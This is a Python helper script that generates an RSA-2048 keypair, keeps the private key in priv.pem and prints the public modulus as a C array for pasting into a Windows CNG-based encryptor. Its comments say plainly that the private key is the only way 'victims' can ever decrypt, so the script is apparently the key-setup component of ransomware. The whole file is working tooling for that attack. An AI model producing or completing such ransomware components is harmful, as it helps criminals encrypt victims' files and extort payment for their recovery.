#!/usr/bin/env python3
# gen_rsa.py — generates a fresh RSA-2048 keypair, dumps the pubkey modulus as a C array.
# private key lands in priv.pem. KEEP IT. that file is the only way victims ever decrypt.

from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
import os
import shutil
import sys
import time

def main():
    print("[*] generating rsa-2048 keypair...", file=sys.stderr)
    k = RSA.generate(2048)

    out = "priv.pem"
    if os.path.exists(out) and "--force" not in sys.argv:
        print(f"[-] {out} exists; refusing to overwrite the only decryption key "
              "(use --force and keep a backup)", file=sys.stderr)
        return 2
    if os.path.exists(out):
        backup = out + ".bak-" + str(int(time.time()))
        shutil.copy2(out, backup)
        print(f"[*] backed up existing key -> {backup}", file=sys.stderr)
    with open(out, "wb") as f:
        f.write(k.export_key(format="PEM"))
    print("[+] private key -> priv.pem  (KEEP THIS, NEVER SHIP IT)", file=sys.stderr)

    # modulus -> 256-byte BIG-endian, which is what BCRYPT_RSAPUBLIC_BLOB
    # expects (magic, bitlen, cbPublicExp, cbModulus, exponent, modulus).
    # Do NOT reverse this: a little-endian modulus wraps the AES key under a
    # different RSA key and nobody can ever decrypt it.
    n_be = long_to_bytes(k.n, 256)
    assert len(n_be) == 256, f"modulus length wrong: {len(n_be)}"

    print()
    print("// paste into kRsaPubMod — replaces the placeholder array")
    print("inline const uint8_t kRsaPubMod[256] = {")
    for i in range(0, 256, 16):
        row = ", ".join(f"0x{b:02X}" for b in n_be[i:i+16])
        print(f"    {row},")
    print("};")
    print()


    from Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP
    from Crypto.Hash import SHA256
    pub = k.publickey()
    test = b"VEXTEST1"
    enc_v15 = PKCS1_v1_5.new(pub).encrypt(test)
    enc_oaep = PKCS1_OAEP.new(pub, hashAlgo=SHA256).encrypt(test)
    print(f"[+] wrap test: v1.5={len(enc_v15)}B oaep={len(enc_oaep)}B (expected 256)",
          file=sys.stderr)
    if len(enc_v15) != 256 or len(enc_oaep) != 256:
        print("[!] WARNING: ciphertext length != 256. do not ship.", file=sys.stderr)
        sys.exit(1)
    print("[+] done. paste the block above, ship priv.pem nowhere.", file=sys.stderr)

if __name__ == "__main__":
    main()